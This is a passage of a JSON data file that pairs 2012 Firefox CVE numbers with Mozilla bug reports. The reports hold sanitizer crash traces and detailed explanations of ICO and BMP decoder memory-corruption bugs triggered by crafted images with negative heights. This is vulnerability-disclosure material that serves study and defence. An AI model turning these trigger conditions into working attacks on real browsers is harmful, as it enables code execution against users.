firefox/src/../../dist/include/nsTArray.h:932 #7 0x7f1d2283db0d in mozilla::Selection::AddItem(nsRange*, int*) firefox/src/layout/generic/nsSelection.cpp:3535 #8 0x7f1d228674fe in mozilla::Selection::AddRange(nsIDOMRange*) firefox/src/layout/generic/nsSelection.cpp:4414 #9 0x7f1d2b8c58db in mozInlineSpellChecker::AddRange(nsISelection*, nsIDOMRange*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1600 #10 0x7f1d2b8c2d1d in mozInlineSpellChecker::DoSpellCheck(mozInlineSpellWordUtil&, nsISelection*, mozInlineSpellStatus*, bool*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1399 #11 0x7f1d2b8c70f1 in mozInlineSpellChecker::ResumeCheck(mozInlineSpellStatus*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1488 #12 0x7f1d2b8cf9dc in mozInlineSpellResume::Run() firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:462 #13 0x7f1d2d045ccd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #14 0x7f1d2ccd501d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #15 0x7f1d2bd76226 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #16 0x7f1d2d2f984a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #17 0x7f1d2d2f9693 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #18 0x7f1d2d2f9578 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #19 0x7f1d2b2ae42e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #20 0x7f1d29ef9668 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #21 0x7f1d20736280 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #22 0x7f1d2073cc22 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #23 0x7f1d207400f2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #24 0x40c28f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #25 0x409cbd in main firefox/src/browser/app/nsBrowserApp.cpp:330 #26 0x7f1d3b388c4d in ?? ??:0 0x7f1cf1264780 is located 0 bytes inside of 64-byte region [0x7f1cf1264780,0x7f1cf12647c0) freed by thread T0 here: #0 0x4a4392 in free ??:0 #1 0x7f1d382165c3 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 #2 0x7f1d23d7e6c6 in ~nsRange firefox/src/content/base/src/nsRange.cpp:215 #3 0x7f1d23d82997 in nsRange::Release() firefox/src/content/base/src/nsRange.cpp:258 #4 0x7f1d2220e6a0 in ~nsRefPtr firefox/src/../../../dist/include/nsAutoPtr.h:874 #5 0x7f1d221a42b3 in ~nsRefPtr firefox/src/../../../dist/include/nsAutoPtr.h:875 #6 0x7f1d2288b4d3 in RangeData::~RangeData() firefox/src/../../dist/include/mozilla/Selection.h:24 #7 0x7f1d227ea3b3 in RangeData::~RangeData() firefox/src/../../dist/include/mozilla/Selection.h:24 #8 0x7f1d228838e3 in nsTArrayElementTraits<RangeData>::Destruct(RangeData*) firefox/src/../../dist/include/nsTArray.h:349 #9 0x7f1d228823be in nsTArray<RangeData, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) firefox/src/../../dist/include/nsTArray.h:1210 #10 0x7f1d22852ab7 in nsTArray<RangeData, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) firefox/src/../../dist/include/nsTArray.h:932 #11 0x7f1d2283db0d in mozilla::Selection::AddItem(nsRange*, int*) firefox/src/layout/generic/nsSelection.cpp:3535 #12 0x7f1d228674fe in mozilla::Selection::AddRange(nsIDOMRange*) firefox/src/layout/generic/nsSelection.cpp:4414 #13 0x7f1d2b8c58db in mozInlineSpellChecker::AddRange(nsISelection*, nsIDOMRange*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1600 #14 0x7f1d2b8c2d1d in mozInlineSpellChecker::DoSpellCheck(mozInlineSpellWordUtil&, nsISelection*, mozInlineSpellStatus*, bool*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1399 #15 0x7f1d2b8c70f1 in mozInlineSpellChecker::ResumeCheck(mozInlineSpellStatus*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1488 #16 0x7f1d2b8cf9dc in mozInlineSpellResume::Run() firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:462 #17 0x7f1d2d045ccd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #18 0x7f1d2ccd501d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #19 0x7f1d2bd76226 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #20 0x7f1d2d2f984a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #21 0x7f1d2d2f9693 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #22 0x7f1d2d2f9578 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #23 0x7f1d2b2ae42e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #24 0x7f1d29ef9668 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #25 0x7f1d20736280 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #26 0x7f1d2073cc22 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #27 0x7f1d207400f2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #28 0x40c28f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #29 0x409cbd in main firefox/src/browser/app/nsBrowserApp.cpp:330 previously allocated by thread T0 here: #0 0x4a4452 in __interceptor_malloc ??:0 #1 0x7f1d38216717 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f1d2b8dc0e3 in mozInlineSpellWordUtil::MakeRange(mozInlineSpellWordUtil::NodeOffset, mozInlineSpellWordUtil::NodeOffset, nsRange**) firefox/src/extensions/spellcheck/src/mozInlineSpellWordUtil.cpp:322 #3 0x7f1d2b8d9fc6 in mozInlineSpellWordUtil::MakeRangeForWord(mozInlineSpellWordUtil::RealWord const&, nsRange**) firefox/src/extensions/spellcheck/src/mozInlineSpellWordUtil.cpp:226 #4 0x7f1d2b8dee62 in mozInlineSpellWordUtil::GetNextWord(nsAString_internal&, nsRange**, bool*) firefox/src/extensions/spellcheck/src/mozInlineSpellWordUtil.cpp:297 #5 0x7f1d2b8c1906 in mozInlineSpellChecker::DoSpellCheck(mozInlineSpellWordUtil&, nsISelection*, mozInlineSpellStatus*, bool*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1317 #6 0x7f1d2b8c70f1 in mozInlineSpellChecker::ResumeCheck(mozInlineSpellStatus*) firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:1488 #7 0x7f1d2b8cf9dc in mozInlineSpellResume::Run() firefox/src/extensions/spellcheck/src/mozInlineSpellChecker.cpp:462 #8 0x7f1d2d045ccd in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #9 0x7f1d2ccd501d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #10 0x7f1d2bd76226 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #11 0x7f1d2d2f984a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #12 0x7f1d2d2f9693 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #13 0x7f1d2d2f9578 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #14 0x7f1d2b2ae42e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #15 0x7f1d29ef9668 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:257 #16 0x7f1d20736280 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3787 #17 0x7f1d2073cc22 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3864 #18 0x7f1d207400f2 in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3940 #19 0x40c28f in do_main(int, char**) firefox/src/browser/app/nsBrowserApp.cpp:160 #20 0x409cbd in main firefox/src/browser/app/nsBrowserApp.cpp:330 #21 0x7f1d3b388c4d in ?? ??:0 ==25564== ABORTING Stats: 156M malloced (189M for red zones) by 464984 calls Stats: 41M realloced by 20345 calls Stats: 112M freed by 231687 calls Stats: 0M really freed by 0 calls Stats: 376M (96306 full pages) mmaped in 94 calls mmaps by size class: 8:393192; 9:49146; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:176; 19:48; 20:16; mallocs by size class: 8:376983; 9:47309; 10:16409; 11:17335; 12:2458; 13:1841; 14:1416; 15:336; 16:562; 17:116; 18:165; 19:41; 20:13; frees by size class: 8:163249; 9:36760; 10:12958; 11:14054; 12:1531; 13:948; 14:1228; 15:278; 16:474; 17:101; 18:58; 19:38; 20:10; rfrees by size class: Stats: malloc large: 335 small slow: 2084 Shadow byte and word: 0x1fe39e24c8f0: fd 0x1fe39e24c8f0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe39e24c8d0: fd fd fd fd fd fd fd fd 0x1fe39e24c8d8: fd fd fd fd fd fd fd fd 0x1fe39e24c8e0: fa fa fa fa fa fa fa fa 0x1fe39e24c8e8: fa fa fa fa fa fa fa fa =>0x1fe39e24c8f0: fd fd fd fd fd fd fd fd 0x1fe39e24c8f8: fd fd fd fd fd fd fd fd 0x1fe39e24c900: fa fa fa fa fa fa fa fa 0x1fe39e24c908: fa fa fa fa fa fa fa fa 0x1fe39e24c910: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-3963": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=762280",
        "title": "use after free in js::gc::MapAllocToTraceKind",
        "description": "Reproduces on trunk. 20120605092342 http://hg.mozilla.org/mozilla-central/rev/c76497029f0d ================================================================= ==16916== ERROR: AddressSanitizer global-buffer-overflow on address 0x7fab8bdc5bb0 at pc 0x7fab8ab5e87d bp 0x7fab789bbdd0 sp 0x7fab789bbdc8 READ of size 4 at 0x7fab8bdc5bb0 thread T2 #0 0x7fab8ab5e87d in js::gc::MapAllocToTraceKind(js::gc::AllocKind) /usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp:0 #1 0x7fab88c80099 in nsXMLHttpRequest::cycleCollection::Trace(void*, void (*)(void*, char const*, void*), void*) /usr/local/google/home/aarya/firefox/src/content/base/src/nsXMLHttpRequest.cpp:663 #2 0x7fab88c7c9ca in nsXHREventTarget::cycleCollection::Traverse(void*, nsCycleCollectionTraversalCallback&) /usr/local/google/home/aarya/firefox/src/content/base/src/nsXMLHttpRequest.cpp:287 #3 0x7fab8a2cf99e in nsCycleCollector::MarkRoots(GCGraphBuilder&) /usr/local/google/home/aarya/firefox/src/xpcom/base/nsCycleCollector.cpp:2054 #4 0x7fab8a2d1db7 in nsCycleCollector::BeginCollection(nsICycleCollectorListener*) /usr/local/google/home/aarya/firefox/src/xpcom/base/nsCycleCollector.cpp:2760 #5 0x7fab8a2d667e in nsCycleCollectorRunner::Run() /usr/local/google/home/aarya/firefox/src/xpcom/base/nsCycleCollector.cpp:3049 #6 0x7fab8a2b0824 in nsThread::ProcessNextEvent(bool, bool*) /usr/local/google/home/aarya/firefox/src/xpcom/threads/nsThread.cpp:624 #7 0x7fab8a21e16d in NS_ProcessNextEvent_P(nsIThread*, bool) /usr/local/google/home/aarya/firefox/src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:213 #8 0x7fab8a2aebbd in nsThread::ThreadFunc(void*) /usr/local/google/home/aarya/firefox/src/xpcom/threads/nsThread.cpp:256 #9 0x7fab8edcf706 in _pt_root /usr/local/google/home/aarya/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:158 0x7fab8bdc5bb0 is located 0 bytes to the right of global variable 'js::gc::MapAllocToTraceKind(js::gc::AllocKind)::map (/usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp)' (0x7fab8bdc5b60) of size 80 'js::gc::MapAllocToTraceKind(js::gc::AllocKind)::map (/usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp)' is ascii string '' ==16916== ABORTING Stats: 186M malloced (195M for red zones) by 404853 calls Stats: 46M realloced by 21407 calls Stats: 156M freed by 274895 calls Stats: 24M really freed by 46335 calls Stats: 412M (105532 full pages) mmaped in 103 calls mmaps by size class: 8:311277; 9:57337; 10:24570; 11:22517; 12:4096; 13:2560; 14:1792; 15:512; 16:640; 17:160; 18:208; 19:56; 20:20; mallocs by size class: 8:298456; 9:55207; 10:22104; 11:19974; 12:4008; 13:2088; 14:1570; 15:393; 16:638; 17:146; 18:196; 19:55; 20:18; frees by size class: 8:188758; 9:43497; 10:18577; 11:16765; 12:2858; 13:1836; 14:1370; 15:330; 16:533; 17:126; 18:181; 19:50; 20:14; rfrees by size class: 8:37269; 9:2590; 10:2242; 11:3443; 12:169; 13:216; 14:139; 15:48; 16:159; 17:29; 18:21; 19:9; 20:1; Stats: malloc large: 415 small slow: 2219 Shadow byte and word: 0x1ff5717b8b76: f9 0x1ff5717b8b70: 00 00 00 00 00 00 f9 f9 More shadow bytes: 0x1ff5717b8b50: 00 00 00 00 06 f9 f9 f9 0x1ff5717b8b58: f9 f9 f9 f9 05 f9 f9 f9 0x1ff5717b8b60: f9 f9 f9 f9 00 06 f9 f9 0x1ff5717b8b68: f9 f9 f9 f9 00 00 00 00 =>0x1ff5717b8b70: 00 00 00 00 00 00 f9 f9 0x1ff5717b8b78: f9 f9 f9 f9 00 00 00 00 0x1ff5717b8b80: 00 00 00 00 00 00 00 00 0x1ff5717b8b88: 00 00 00 00 00 00 00 00 0x1ff5717b8b90: 00 00 00 00 00 00 00 00"
      }
    ],
    "CVE-2012-3964": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=756241",
        "title": "Heap-use-after-free READ 8 in gfxTextRun::GetUserData",
        "description": "Reproduces on trunk 20120517130245 http://hg.mozilla.org/mozilla-central/rev/895e12563245 ================================================================= ==6180== ERROR: AddressSanitizer heap-use-after-free on address 0x7f861c5860b8 at pc 0x7f863c987298 bp 0x7fff028995e0 sp 0x7fff028995d8 READ of size 8 at 0x7f861c5860b8 thread T0 #0 0x7f863c987298 in gfxTextRun::GetUserData() const src/modules/zlib/src/inffast.c:0 0x7f861c5860b8 is located 56 bytes inside of 6712-byte region [0x7f861c586080,0x7f861c587ab8) freed by thread T0 here: #0 0x4244a2 in free #1 0x7f863c9941bd in nsTextFrame::ClearTextRuns() src/layout/generic/nsTextFrame.h:432 previously allocated by thread T0 here: #0 0x424562 in malloc #1 0x7f863e38da84 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) src/gfx/thebes/gfxFont.cpp:4290 ==6180== ABORTING Stats: 125M malloced (131M for red zones) by 252339 calls Stats: 28M realloced by 12734 calls Stats: 85M freed by 119994 calls Stats: 0M really freed by 0 calls Stats: 292M (74798 full pages) mmaped in 73 calls mmaps by size class: 8:212979; 9:40955; 10:12285; 11:12282; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:96; 18:144; 19:40; 20:16; mallocs by size class: 8:191798; 9:34053; 10:9717; 11:10403; 12:2011; 13:1813; 14:1446; 15:277; 16:565; 17:65; 18:139; 19:39; 20:13; frees by size class: 8:80912; 9:21306; 10:5944; 11:7541; 12:1292; 13:971; 14:1169; 15:231; 16:498; 17:52; 18:29; 19:38; 20:11; rfrees by size class: Stats: malloc large: 256 small slow: 1500 Shadow byte and word: 0x1ff0c38b0c17: fd 0x1ff0c38b0c10: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff0c38b0bf0: fa fa fa fa fa fa fa fa 0x1ff0c38b0bf8: fa fa fa fa fa fa fa fa 0x1ff0c38b0c00: fa fa fa fa fa fa fa fa 0x1ff0c38b0c08: fa fa fa fa fa fa fa fa =>0x1ff0c38b0c10: fd fd fd fd fd fd fd fd 0x1ff0c38b0c18: fd fd fd fd fd fd fd fd 0x1ff0c38b0c20: fd fd fd fd fd fd fd fd 0x1ff0c38b0c28: fd fd fd fd fd fd fd fd 0x1ff0c38b0c30: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-3965": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=769108",
        "title": "Chrome-privileged about:newtab remains in the history chain",
        "description": "When user opens a page from a new tab, by either typing in the URL bar or selecting one of the pinned/bookmarked sites, then any page subsequently loaded in this tab can spawn a new window and navigate itself back to about:newtab. This is inherently unsafe, because about:newtab is chrome-privileged, and content can use the obtained reference for privilege escalation attacks."
      }
    ],
    "CVE-2012-3966": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775794",
        "title": "nsICODecoder transparency bitmask memory corruption",
        "description": "This bug is present in the nsICODecoder class, when processing the transparency bitmask. It allows a remote attacker to write random memory, hence the critical severity. User action is needed in the following form: the user needs to open a web page containing a specially crafted image. First, a little summary of how Firefox processes a BMP embedded inside an ICO image: -It reads the ICONDIRENTRY -It reads the image header -It divides the image height by 2 -It passes the image header and the image data to a BMP decoder -It applies the transparency bitmask to the rendered image. Before passing the BMP image header and data to the BMP decoder, the nsICODecoder checks that the properties in the ICONDIRENTRY structure are consistent with the properties in the BMP header, and fixes them if necessary. Since the maximum height of an icon is 256, it checks that the BMP header height is no more than 256 (the image is considered invalid if it exceeds 256). Also, if the height in the ICONDIRENTRY structure and the height in the BMP header don't match, then the height in the BMP header is trusted over the height in the ICONDIRENTRY structure. Here is the code responsible for doing this, in the file nsICODecoder.cpp: 166 // A BMP inside of an ICO has *2 height because of the AND mask 167 // that follows the actual bitmap. The BMP shouldn't know about 168 // this difference though. 169 bool 170 nsICODecoder::FixBitmapHeight(PRInt8 *bih) 171 { 172 // Get the height from the BMP file information header 173 PRInt32 height; 174 memcpy(&height, bih + 8, sizeof(height)); 175 height = LITTLE_TO_NATIVE32(height); 176 177 // The bitmap height is by definition * 2 what it should be to account for 178 // the 'AND mask'. It is * 2 even if the `AND mask` is not present. 179 height /= 2; 180 181 if (height > 256) { 182 return false; 183 } 184 185 // We should always trust the height from the bitmap itself instead of 186 // the ICO height. So fix the ICO height. 187 if (height == 256) { 188 mDirEntry.mHeight = 0; 189 } else { 190 mDirEntry.mHeight = (PRInt8)height; 191 } 192 193 // Fix the BMP height in the BIH so that the BMP decoder can work properly 194 height = NATIVE32_TO_LITTLE(height); 195 memcpy(bih + 8, &height, sizeof(height)); 196 return true; 197 } The mDirEntry.mHeight variable is then used to calculate the pixel offset when applying the transparency bitmask. Note: GetRealHeight() returns mDirEntry.mHeight: 542 mCurLine = GetRealHeight(); [...] 575 PRUint32* decoded = imageData + mCurLine * GetRealWidth(); 576 PRUint32* decoded_end = decoded + GetRealWidth(); 577 PRUint8* p = mRow, *p_end = mRow + rowSize; 578 while (p < p_end) { 579 PRUint8 idx = *p++; 580 for (PRUint8 bit = 0x80; bit && decoded<decoded_end; bit >>= 1) { 581 // Clear pixel completely for transparency. 582 if (idx & bit) { 583 *decoded = 0; 584 } 585 decoded++; 586 } 587 } The vulnerability is in the nsICODecoder::FixBitmapHeight function. The \"height\" variable is declared as a PRInt32, which is a signed 32 bits integer. Consequently, if the \"height\" field of the BMP header is negative, it will pass the check at line 181: 181 if (height > 256) { 182 return false; 183 } It will then be truncated to fit into a 8 bits integer, namely mDirEntry.mHeight: 187 if (height == 256) { 188 mDirEntry.mHeight = 0; 189 } else { 190 mDirEntry.mHeight = (PRInt8)height; 191 } mDirEntry.mHeight is an unsigned 8 bits integer, so when it is assigned to mCurLine, mCurLine can be higher than the real height of the image, causing the processing of the transparency bitmask to write past the imageData array, resulting in memory corruption. This is possible because negative heights in BMP headers are acceptable, so the BMP decoder will process the image normally. To illustrate what happens with an example, we'll take a 32x8 pixels image. We have to double the initial height to account for the transparency bitmask, and make it negative, so the \"height\" value in the BMP header will be -16, which is 0xfffffff0. When we enter the nsICODecoder::FixBitmapHeight function, here is what happens: -First, the \"height\" is divided by 2. Its new value is -8, or 0xfffffff8. -The check at line 181 is passed, since -8 is not superior to 256. -mDirEntry.mHeight is assigned the value of 0xf8 (which is 0xfffffff8 truncated to 8 bits). -The BMP decoder processes the BMP data, allocating an array large enough to contain our 32x8 pixels image. -The mCurLine variable is assigned the value of mDirEntry.mHeight. Since mDirEntry.mHeight is an unsigned byte, mCurLine is equal to 0x000000f8, which is 248 in decimal. -nsICODecoder uses mCurLine to calculate an offset to the image data array. Since 248 is larger than the image real height of 8, data is written past the end of the imageData array, causing memory corruption (at line 583). The attached sample ICO file triggers the vulnerability. Here is a WinDbg log when exploiting the vulnerability in Firefox on Windows XP: (540.564): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=071a7c80 ebx=01f03b64 ecx=01f03b63 edx=000000ff esi=071a7bc0 edi=05f86530 eip=0113834a esp=0012cc68 ebp=0012cca8 iopl=0 nv up ei ng nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010282 e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\decoders\\nsicodecoder.cpp(583) xul!mozilla::imagelib::nsICODecoder::WriteInternal+0x60a: 0113834a c70600000000 mov dword ptr [esi],0 ds:0023:071a7bc0=???????? 0:000> k ChildEBP RetAddr 0012cca8 010de143 xul!mozilla::imagelib::nsICODecoder::WriteInternal+0x60a [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\decoders\\nsicodecoder.cpp @ 583] 0012ccc8 0113410e xul!mozilla::imagelib::RasterImage::WriteToDecoder+0x3e [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2370] 0012cce4 010b9526 xul!mozilla::imagelib::RasterImage::DecodeSomeData+0x35 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2702] 0012cd3c 010f6ba2 xul!mozilla::imagelib::imgDecodeWorker::Run+0xfe [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2819] 0012cd50 010f6be3 xul!mozilla::imagelib::RasterImage::AddSourceData+0xcf [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 1496] 0012cda4 0104cfb6 xul!mozilla::imagelib::RasterImage::WriteToRasterImage+0x15 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2917] 0012cda4 0104cfb6 xul!imgRequest::OnDataAvailable+0x466 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgrequest.cpp @ 1166] 0012d004 010f1121 xul!imgRequest::OnDataAvailable+0x466 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgrequest.cpp @ 1166] 0012d024 010a7f3a xul!ProxyListener::OnDataAvailable+0x26 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgloader.cpp @ 2091] 0012d050 010981c3 xul!nsBaseChannel::OnDataAvailable+0x49 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsbasechannel.cpp @ 774] 0012d094 0109807a xul!nsInputStreamPump::OnStateTransfer+0xd3 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsinputstreampump.cpp @ 512] 0012d0a8 01097df3 xul!nsInputStreamPump::OnInputStreamReady+0x6d [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsinputstreampump.cpp @ 409] 0012d0b8 00fbee5f xul!nsInputStreamReadyEvent::Run+0x1d [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\xpcom\\io\\nsstreamutils.cpp @ 115] 0012d110 00fe3e9e xul!nsThread::ProcessNextEvent+0x19f [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\xpcom\\threads\\nsthread.cpp @ 666] 0012d144 011bc8e2 xul!mozilla::ipc::MessagePump::Run+0x6e [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\ipc\\glue\\messagepump.cpp @ 110] 0012d17c 011bc8b3 xul!MessageLoop::RunHandler+0x21 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\ipc\\chromium\\src\\base\\message_loop.cc @ 202] 0012d198 011991b8 xul!MessageLoop::Run+0x15 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\ipc\\chromium\\src\\base\\message_loop.cc @ 176] 0012d1a4 011bc9b0 xul!nsBaseAppShell::Run+0x34 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\widget\\src\\xpwidgets\\nsbaseappshell.cpp @ 191] 0012f0f8 011bc9f2 xul!nsAppShell::Run+0x4d [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\widget\\src\\windows\\nsappshell.cpp @ 258] 0012f4a4 00401796 xul!nsAppStartup::Run+0x1e [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\toolkit\\components\\startup\\nsappstartup.cpp @ 221] 0012ff7c 00401ab0 firefox!wmain+0x796 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\toolkit\\xre\\nswindowswmain.cpp @ 107] 0012ffc0 7c817077 firefox!__tmainCRTStartup+0x10f [f:\\sp\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c @ 594]"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775793",
        "title": "nsBMPDecoder alpha channel processing memory corruption",
        "description": "This bug is present in the nsBMPDecoder class, in the code responsible for processing alpha channel data. It allows a remote attacker to write random memory, hence the critical severity. User action is needed in the following form: the user needs to open a web page containing a specially crafted image. The vulnerable code lies in nsBMPDecoder.cpp, at line 519: 510 if (mUseAlphaData) { 511 if (!mHaveAlphaData && p[3]) { 512 // Non-zero alpha byte detected! Clear previous 513 // pixels that we have already processed. 514 // This works because we know that if we 515 // are reaching here then the alpha data in byte 516 // 4 has been right all along. And we know it 517 // has been set to 0 the whole time, so that 518 // means that everything is transparent so far. 519 memset(mImageData + (mCurLine - 1) * GetWidth(), 0, 520 (GetHeight() - mCurLine + 1) * 521 GetWidth() * sizeof(PRUint32)); 522 mHaveAlphaData = true; 523 } This code is responsible for clearing pixels in the mImageData array, when it is processing a BMP image with an alpha channel, and encounters for the first time a non-zero alpha byte. The third parameter of memset is calculated using GetHeight(), which returns the raw \"height\" header value, even when it is negative (which is allowed for BMP images, it means pixels are stored top-to-bottom instead of bottom-to-top). The result of this calculation is then used as an unsigned 32 bits integer by memset. If GetHeight() returns a negative value, the calculation will result in a very large unsigned number, and memset() will run past the mImageData array, resulting in a memory corruption, which could in turn lead to arbitrary code execution. The code snippet above will be executed only if mUseAlphaData is true. The only way for this to happen is to have a BMP image embedded in an icon file (.ico). The nsICODecoder will instantiate a nsBMPDecoder, and call its method SetUseAlphaData with the parameter \"true\", which will set mUseAlphaData to true: nsICODecoder.cpp: 434 nsBMPDecoder *bmpDecoder = new nsBMPDecoder(mImage, mObserver); 435 mContainedDecoder = bmpDecoder; 436 bmpDecoder->SetUseAlphaData(true); Another condition is that the BMP pixel array must be in 32 bits per pixel format (Red, Green, Blue, Alpha). This is done simply by setting the \"bpp\" field to 32 in the image header. The last condition is that at least one alpha byte must be non-zero. The attached file \"bmp_with_alpha.ico\" triggers the vulnerability. Here is a WinDbg log when exploiting the vulnerability in Firefox on Windows XP: (53c.734): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=062f0380 ebx=05c3a0d0 ecx=01ffffd8 edx=00000000 esi=05d1fdd8 edi=062f1000 eip=781472d7 esp=0012cbe8 ebp=0012cbec iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 MSVCR80!strnicmp+0x7c: 781472d7 660f7f07 movdqa xmmword ptr [edi],xmm0 ds:0023:062f1000=???????????????????????????????? 0:000> k ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong. 0012cbec 78147344 MSVCR80!strnicmp+0x7c 0012cc0c 012ecf98 MSVCR80!strnicmp+0xe9 0012cc44 0119f049 xul!mozilla::imagelib::nsBMPDecoder::WriteInternal+0x1a9368 0012cca8 010de143 xul!mozilla::imagelib::nsICODecoder::FixBitmapWidth+0x13 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\decoders\\nsicodecoder.cpp @ 208] 0012ccc8 0113410e 